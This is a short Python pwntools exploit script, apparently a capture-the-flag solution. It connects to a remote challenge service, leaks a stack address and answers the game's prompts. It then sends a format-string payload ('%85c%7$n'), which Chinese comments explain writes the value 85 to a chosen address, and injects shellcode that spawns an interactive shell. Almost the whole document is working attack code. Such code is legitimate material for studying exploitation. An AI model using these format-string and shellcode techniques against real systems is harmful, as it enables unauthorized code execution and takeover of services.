# shellcode
from pwn import *
p=remote('124.126.19.106','49759')

context(arch='amd64', os='linux', log_level='debug')
p.recvuntil('secret[0] is ')
v4_addr = int(p.recvuntil('\n')[:-1], 16)
p.sendlineafter("What should your character's name be:", 'cxk')
p.sendlineafter("So, where you will go?east or up?:", 'east')
p.sendlineafter("go into there(1), or leave(0)?:", '1')
p.sendlineafter("'Give me an address'", str(int(v4_addr)))
# %85c%7$n ，作用是将85写入栈内第7个参数所指向的地址
# %85c 输出了85个字符，再用 %7$n 将第七个参数的位置写成了85
p.sendlineafter("And, you wish is:", '%85c%7$n') 
# gdb.attach(sh)
shellcode = asm(shellcraft.sh())
p.sendlineafter("USE YOU SPELL", shellcode)
p.interactive()